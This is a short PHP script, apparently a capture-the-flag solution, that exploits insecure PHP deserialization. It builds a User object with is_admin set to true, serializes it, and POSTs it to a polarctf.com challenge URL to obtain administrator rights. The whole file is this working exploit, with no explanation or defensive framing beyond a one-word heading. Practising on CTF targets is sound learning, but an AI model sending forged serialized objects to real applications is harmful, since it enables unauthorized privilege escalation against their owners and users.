//反序列化
class User {
    public $username;
    public $is_admin;
}

$user = new User();
$user->username = 'your_username';
$user->is_admin = true;
$serialized_data = serialize($user);

$url = 'http://9c299322-2393-4891-a4a0-21efe1cd12a0.www.polarctf.com:8090/'; // 替换为实际的 API URL
$data = ['data' => $serialized_data];

$options = [
    'http' => [
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data),
    ],
];
$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);